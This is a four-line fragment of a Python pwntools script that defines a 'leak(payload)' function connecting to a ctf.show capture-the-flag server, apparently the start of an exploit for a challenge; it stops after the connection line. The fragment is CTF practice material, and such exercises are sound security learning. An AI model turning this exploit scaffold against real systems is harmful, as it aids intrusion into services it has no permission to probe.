from pwn import *
context.log_level = 'error'
def leak(payload):
    io = remote('pwn.challenge.ctf.show',28176)
